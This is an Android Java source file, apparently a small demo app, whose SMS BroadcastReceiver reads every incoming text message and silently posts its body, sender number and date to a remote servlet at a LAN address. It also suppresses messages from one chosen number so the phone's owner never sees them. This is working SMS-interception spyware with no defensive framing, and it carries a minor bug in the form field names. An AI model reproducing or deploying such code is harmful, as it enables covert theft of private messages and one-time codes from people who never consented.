package com.zhi.smslistener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Administrator on 2016/10/31.
 */
public class SMSBroadcastReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSBroadcastReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        for(Object p : pdus){
            byte[] pdu = (byte[]) p;
            SmsMessage message = SmsMessage.createFromPdu(pdu);
            final String content = message.getMessageBody();
            final String sender = message.getOriginatingAddress();
            long time = message.getTimestampMillis();
            Date date = new Date(time);
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
            final String sendDate = dateFormat.format(date);

            new Thread(){
                public void run(){
                    boolean isSuccess = sendMessage(content, sender, sendDate);
                    if(isSuccess){
                        Log.d(TAG, "成功发送给服务器端了");
                    }
                }
            }.start();

            if("1234".equals(sender)){  //如果是1234号码的用户发给手机用户，就屏蔽，不让手机用户接受到短信
                abortBroadcast();
            }
        }

    }

    private boolean sendMessage(String content, String sender, String sendDate) {
        String path = "http://192.168.1.5:8080/FileUpload/ReceiveServlet";
        try {
            String data = "content="+ URLEncoder.encode(content, "UTF-8")+"&sendernumber="+sender+"&receivetime"+sendDate;
            byte[] bytes = data.getBytes();

            URL url = new URL(path);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(5000);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
            connection.setRequestProperty("Content-Length", String.valueOf(bytes.length));

            connection.getOutputStream().write(bytes);
            int state = connection.getResponseCode();
            if(200 == state){
                return true;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }
}
